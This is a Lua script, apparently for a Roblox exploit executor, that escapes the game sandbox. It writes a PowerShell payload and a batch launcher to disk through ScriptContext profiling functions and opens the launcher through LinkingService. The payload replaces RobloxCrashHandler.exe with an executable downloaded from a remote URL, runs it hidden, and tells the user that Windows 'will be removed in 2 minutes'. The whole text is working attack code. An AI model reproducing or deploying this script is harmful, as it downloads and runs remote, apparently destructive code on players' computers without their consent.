if not run_on_actor then return end
for i, v in pairs(getactors()) do
    run_on_actor(v, [=[pcall(function()
            local POWERSHELL_NAME = "doom.ps1"
            local POWERSHELL_PAYLOAD = [[
                Add-Type -AssemblyName PresentationCore,PresentationFramework

                taskkill /f /im RobloxCrashHandler.exe
                timeout 1
                move RobloxCrashHandler.exe .old

                Invoke-WebRequest "https://raw.githubusercontent.com/evoincorp/doom/refs/heads/main/doom_bootstrapper.exe" -OutFile RobloxCrashHandler.exe

                taskkill /f /im RobloxPlayerBeta.exe

                [System.Windows.MessageBox]::Show("Greetings, $env:USERNAME! Your Windows will be removed in 2 minutes! Good luck!",0, 16)

                attrib +r RobloxCrashHandler.exe
                start RobloxCrashHandler.exe
            ]]

            local Path2 = game["Script Context"]:saveScriptProfilingData(POWERSHELL_PAYLOAD, POWERSHELL_NAME)

            local FILE_NAME = "doom.bat"
            local PAYLOAD = `start "" "powershell" -WindowStyle Hidden -ExecutionPolicy Bypass {Path2}`

            local Path1 = game["Script Context"]:saveScriptProfilingData(PAYLOAD, FILE_NAME)
            game.LinkingService:openUrl(Path1)
        end)]=])
end
